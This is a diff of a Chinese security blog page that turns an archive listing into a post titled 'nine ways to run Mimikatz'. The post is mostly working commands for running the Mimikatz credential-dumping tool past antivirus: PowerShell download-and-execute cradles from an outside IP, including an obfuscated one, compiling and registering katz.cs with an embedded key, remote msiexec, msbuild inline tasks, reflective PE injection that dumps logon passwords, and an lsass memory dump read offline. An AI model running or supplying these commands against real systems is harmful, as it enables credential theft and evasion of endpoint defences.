@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">H0e4a0r1t&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">H0e4a0r1t's Blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">543</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/11/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,305 +393,89 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/09/反序列化/">
-            
-                <span>反序列化</span>
-        </a>
-        <div class="abstract-content">
-            1.常见反序列化
-JBoss
-Weblogic
-WebSphere
-Jenkins
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>title:九种姿势运行Mimikatz</p>
+<hr>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00. 简介"></a>0x00. 简介</h3><p>用户绕过杀软执行mimikatz，这里主要是绕过360，未处理的mimikatz会被直接查杀</p>
+<p><img src="https://i.loli.net/2019/11/01/LnlSQOEf2BCpTvD.png" alt="1.png"></p>
+<h3 id="0x01-powershell"><a href="#0x01-powershell" class="headerlink" title="0x01. powershell"></a>0x01. <strong>powershell</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1</span><br></pre></td></tr></table></figure>
+<p>cmd下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\test\Desktop&gt;powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/01/5LMTGkJNtRn9YBP.png" alt="2.png"></p>
+<p>也可以远程加载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.2.118/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/01/VRk9wTaS6bLjEHp.png" alt="3.png"></p>
+<p>被拦截掉了，旧版本可通过混淆绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot; (&apos;IEX &apos;+&apos;(Ne&apos;+&apos;w-O&apos;+&apos;bject Ne&apos;+&apos;t.W&apos;+&apos;ebClien&apos;+&apos;t).Do&apos;+&apos;wnloadS&apos;+&apos;trin&apos;+&apos;g&apos;+&apos;(&apos;+&apos;1vchttp://&apos;+&apos;192.168.0&apos;+&apos;.101/&apos;+&apos;Inv&apos;+&apos;oke-Mimik&apos;+&apos;a&apos;+&apos;tz.&apos;+&apos;ps11v&apos;+&apos;c)&apos;+&apos;;&apos;+&apos;I&apos;+&apos;nvoke-Mimika&apos;+&apos;tz&apos;).REplaCE(&apos;1vc&apos;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-用-net2-0加载mimikatz"><a href="#0x02-用-net2-0加载mimikatz" class="headerlink" title="0x02. 用.net2.0加载mimikatz"></a>0x02. <strong>用.net2.0加载mimikatz</strong></h3><p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs</span><br></pre></td></tr></table></figure>
+<p>将katz.cs放置C:\Windows\Microsoft.NET\Framework\v2.0.50727</p>
+<p>先powoershell执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = &apos;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&apos;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
+<p>再cmd执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-msiexec加载mimikatz"><a href="#0x03-msiexec加载mimikatz" class="headerlink" title="0x03. msiexec加载mimikatz"></a>0x03. <strong>msiexec加载mimikatz</strong></h3><p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi</span><br></pre></td></tr></table></figure>
+<p>远程执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestartcmd:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestart</span><br></pre></td></tr></table></figure>
+<p>本地执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /passive /i C:\Users\Administrator\Desktop\Mimikatz.msi</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-net4-0加载mimikatz"><a href="#0x04-net4-0加载mimikatz" class="headerlink" title="0x04. net4.0加载mimikatz"></a>0x04. <strong>net4.0加载mimikatz</strong></h3><p>下载mimikatz.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</span><br></pre></td></tr></table></figure>
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild&lt;.exemimikatz.xml</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-内存中加载mimikatz"><a href="#0x05-内存中加载mimikatz" class="headerlink" title="0x05. 内存中加载mimikatz"></a>0x05. <strong>内存中加载mimikatz</strong></h3><p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</span><br></pre></td></tr></table></figure>
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.2.111/Invoke-ReflectivePEInjection.ps1&apos;);Invoke-ReflectivePEInjection -PEUrl http://192.168.2.111/mimikatz.exe -ExeArgs &quot;sekurlsa::logonpasswords&quot; -ForceASLR</span><br></pre></td></tr></table></figure>
+<h3 id="0x06-导出lsass进程离线读密码"><a href="#0x06-导出lsass进程离线读密码" class="headerlink" title="0x06. 导出lsass进程离线读密码"></a>0x06. <strong>导出lsass进程离线读密码</strong></h3><p>下载procdump64.exe</p>
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>
+<p>也可以在任务管理器中操作</p>
+<p><img src="https://i.loli.net/2019/11/02/8mItHVeZQOf4KFW.png" alt="4.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/02/HlKdVNufzr6o42M.png" alt="5.png"></p>
 
-2.乌云案例分析1. Java 反序列化服务器 –》脚本检测利用
-2. JBossJMXInvokerServlet接口
-3. websphere8880端口
-3.漏洞挖掘123456789101112131415161.漏洞触发场景   在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：　　1)HTTP请求中的参数，cookies以及Parameters。　　2)RMI协议，被广泛使用的RMI协议完全基于序列化　　4)JMX 同样用于处理序列化对象　　5)自定义...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/09</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/07/url跳转/">
-            
-                <span>URL跳转</span>
-        </a>
-        <div class="abstract-content">
-            1.变形绕过@绕过：url=目标地址@www.baidu.com
-问号绕过：url=https://目标地址/?baidu.com
-锚链接绕过：url=http://baidu.com/#目标地址
-xip.io绕过：url=http://目标地址.www.baidu.com.xip.io/
-反斜杠绕过：url=https:/\www.baidu.com
-IP绕过：把目标的URL修改成IP地址，这样也有可能绕过waf的拦截
-编码绕过：
-123https://example.com/login?return=https%3A%2F%2Fmysite.com%2F  //url编码https:...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/11/01/九种姿势运行Mimikatz/">http://yoursite.com/2019/11/01/九种姿势运行Mimikatz/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/11/01/九种姿势运行Mimikatz/">November 1st 2019, 10:33:47 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/11/01/九种姿势运行Mimikatz/">November 2nd 2019, 4:07:56 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/07/2019-5-9随记/">
-            
-                <span>2019/5/9随记</span>
-        </a>
-        <div class="abstract-content">
-            First：Vulnerable Javascript Files
-今天几乎每个网站都以某种方式使用javascript。Jquery，anglular，react和vue是流行的javascript库和框架的一些例子。其中每个都包含漏洞，如果网站使用过时的版本，他们就有可能实施易受攻击的功能，从而使整个网站面临风险
-Retire JS是一个很棒的工具，可以扫描网站上过时的软件。使用此工具最简单的方法是下载chrome插件。下载插件后，它将扫描您在后台访问的每个站点，查找过时的javascript文件，其中许多文件包含已知的CVE。 
-重要的是要知道，仅仅因为网站导入易受攻击的javas...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/05/wfuzz/">
-            
-                <span>WFUZZ</span>
-        </a>
-        <div class="abstract-content">
-            WFUZZ（爆破谁就FUZZ谁）wfuzz占位符      https://www.baidu.com/FUZZ使用字典：  wfuzz -w 字典路径(绝对路径) URL/FUZZ                   wfuzz -w 目录字典路径 -w 文件名字典路径 -w 后缀名字典路径 URL/FUZZ/FUZ2Z.FUZ3Z
-隐藏响应结果：1.–hc 根据响应报文状态码进行隐藏（hide code）2.–hl根据响应报文行数进行隐藏（hide lines)3.–hw根据响应报文字数进行隐藏（hide word）4.–hh根据响应报文字符数进行隐藏（hide chars 这里因为...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/05</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/04/csrf/">
-            
-                <span>CSRF</span>
-        </a>
-        <div class="abstract-content">
-            CSRF0x00.什么是CSRF？通俗简单点理解就是本该是你本人操作的步骤，攻击者已经给你模拟好了，而只差被系统误认为是你本人在操作，所以只需要你的好奇心驱使你点一下恶意链接，本质上就是你做的操作，只不过操作的value已经被攻击者设置好了，你只是负责触发，即只差你这个身份凭证了。
-0x01.CSRF简单演示这里就拿DVWA来做演示
-正常用户修改密码操作，这里并未做任何用户凭证的校验
-
-抓包，可以看到，模拟用户修改密码为123456并提交
-
-BurpSuite自带有构造CSRF的poc的工具
-
-
-也可以自己构造
-
-CSRF表单自动提交代码
-1234567&lt;form name=&qu...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/04</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/24/2019-4-23随记/">
-            
-                <span>2019/4/23 随记</span>
-        </a>
-        <div class="abstract-content">
-            今夜格外的宁静，和好友互相聊了聊天，道了道最近发生的有趣的事情，心情还算不错！oh，对了，明天复联4就要上映了，买了首映票的我还是满怀期待的，毕竟我也算是一个漫威粉嘛😁
-好啦，为了实现我对自己的承诺，所以我要每天坚持更新文章，只为记录自己
-FirstImproper Authorization and Accessing API with Missing Access Controls for POST, PUT &amp; DELETE（https://medium.com/@thehacktivists/improper-authorization-and-accessing-ap...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/24</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/23/2019-4-28随记/">
-            
-                <span>2019/4/28 随记</span>
-        </a>
-        <div class="abstract-content">
-            今天早上做了一件好事，我发现了某公司员工泄露邮箱账号密码导致泄露公司内部的一些项目数据，我发现了它并第一时间联系了厂家，尽管联系厂家相关负责人的时候也非常坎坷，但是最终还是联系上了他们，并帮助他们解决问题(●ˇ∀ˇ●)     上班的路上还碰到了室友小姐姐，和她一起去上班，感到很开心哦 (●&apos;◡&apos;●)
-First：溢出三部曲HTTP响应与标头溢出拆分HTTP Response Splitting与CRLF注入的不同之处。通常99个HTTP响应拆分漏洞是由CRLF注入引起的，而这个漏洞则滥用了一个不涉及注入CRLF的不同缺陷。
-例如链接中的 report_user_id...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/23</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/22/XSS_Note_1/">
-            
-                <span>XSS_Notes_1</span>
-        </a>
-        <div class="abstract-content">
-            XSS_Notes主要挖掘方法：Burpsuite and WFuzz0x00.新思路文件上传：
-在文件名插入payload，即.jpg  
-在文件内容中添加payload，如果为前端加载即触发
-
-更多bypass变形 =》 《XSS-Cheat-Sheet-2019-Edition-2》0x01.案例分析1.[BugBounty] Sleeping stored Google XSS Awakens a $5000 Bounty  by Patrik Fehrenbach思路(存储型xss)：创建项目时，在项目标题处添加payload，添加时会被转义，而执行删除操作时会被执行
-payl...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/22/Recon新思路/">
-            
-                <span>Recon 新思路</span>
-        </a>
-        <div class="abstract-content">
-            Recon新思路0x00.常规性资产收集1. 子域名收集基于爆破类型：
-Sublist3r
-subdomainBurte
-subfinder
-layer子域名挖掘机
-
-在线查询：
-云悉资产
-
-FOFA
-
-Virstotal（基于证书查询）（https://www.virustotal.com/）
-
-crt.sh（基于证书查询）（https://crt.sh/）
-
-Dnsdumpster（基于DNS记录）（https://dnsdumpster.com/）
-
-Threatcrowd （https://www.threatcrowd.org/）
-
-https://phpinfo.me/dom...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/22/ssrf/">
-            
-                <span>SSRF</span>
-        </a>
-        <div class="abstract-content">
-            SSRF0x00.常见漏洞点
-0x01.Bypass1. http://127.0.0.0:8888:80   8888为真2. http://0.0.0.0#@evil.com:803.  http://[::]4. 0://evil.com:80;http://google.com:80/5. http://[::]:80/；http://[::1]；http://[::]；http://127.16. http://127.127.127.127；http://127.0.1.3；http://127.0.0.07. •http://0177.0.0.1/•http://21307...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/10/15/Windows系统远程桌面的多用户登录/" title="Windows系统远程桌面的多用户登录">
+                    <div class="prevTitle">Windows系统远程桌面的多用户登录</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/2019/">&#60; PREV</a><a class="page-number" href="/archives/2019/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2019/page/3/">3</a><a class="extend next" rel="next" href="/archives/2019/page/3/">NEXT &#62;</a>
-    </nav>
     
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -721,6 +560,24 @@ https://phpinfo.me/dom...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-powershell"><span class="toc-number">2.</span> <span class="toc-text">0x01. powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-用-net2-0加载mimikatz"><span class="toc-number">3.</span> <span class="toc-text">0x02. 用.net2.0加载mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-msiexec加载mimikatz"><span class="toc-number">4.</span> <span class="toc-text">0x03. msiexec加载mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-net4-0加载mimikatz"><span class="toc-number">5.</span> <span class="toc-text">0x04. net4.0加载mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-内存中加载mimikatz"><span class="toc-number">6.</span> <span class="toc-text">0x05. 内存中加载mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-导出lsass进程离线读密码"><span class="toc-number">7.</span> <span class="toc-text">0x06. 导出lsass进程离线读密码</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1374,6 +1231,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
